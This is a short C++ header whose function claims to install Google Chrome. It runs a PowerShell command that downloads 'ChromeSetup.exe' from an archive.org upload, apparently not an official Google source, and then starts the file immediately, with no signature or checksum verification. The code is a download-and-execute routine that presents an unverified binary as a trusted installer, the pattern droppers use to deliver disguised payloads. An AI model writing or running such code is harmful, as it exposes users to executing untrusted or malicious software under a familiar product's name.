#ifndef CHROME_H
#define CHROME_H

#include <iostream>
#include <cstdlib>

inline void installGoogleChrome() {
    std::cout << "[WAIT FOR PROCESSING]" << std::endl;

    // URL to download Chrome installer
    const std::string url = "https://ia600905.us.archive.org/16/items/chrome-setup_20250612/ChromeSetup.exe";
    const std::string installer = "ChromeSetup.exe";

    // PowerShell command to download the installer
    std::string downloadCmd = "powershell -Command \"Invoke-WebRequest -Uri '" + url + "' -OutFile '" + installer + "'\"";

    // Run the download command
    int ret = system(downloadCmd.c_str());
    if (ret != 0) {
        std::cout << "Failed to download Chrome installer." << std::endl;
        return;
    }

    // Run the installer asynchronously using start command to avoid freezing
    std::string installCmd = "start " + installer;

    ret = system(installCmd.c_str());
    if (ret == 0) {
        std::cout << "Google Chrome installer started successfully!" << std::endl;
    } else {
        std::cout << "Failed to start Google Chrome installer." << std::endl;
    }
}

#endif // CHROME_H

